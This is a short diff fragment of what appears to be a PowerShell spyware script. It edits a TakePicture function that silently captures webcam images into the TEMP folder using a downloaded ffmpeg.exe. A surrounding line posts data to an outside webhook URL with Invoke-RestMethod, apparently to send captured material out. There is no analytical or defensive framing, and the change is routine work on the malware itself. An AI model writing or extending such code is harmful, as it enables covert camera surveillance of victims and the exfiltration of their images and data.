@@ -824,13 +824,7 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 Function TakePicture {
 $outputFolder = "$env:TEMP"
 $outputFile = "$env:TEMP\captured_image.jpg"
-$tempFolder = "$env:TEMP\ffmpeg"
-if (-not (Test-Path -Path $outputFolder)) {
-    New-Item -ItemType Directory -Path $outputFolder | Out-Null
-}
-if (-not (Test-Path -Path $tempFolder)) {
-    New-Item -ItemType Directory -Path $tempFolder | Out-Null
-}
+$tempFolder = "$env:TEMP"
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
 GetFfmpeg
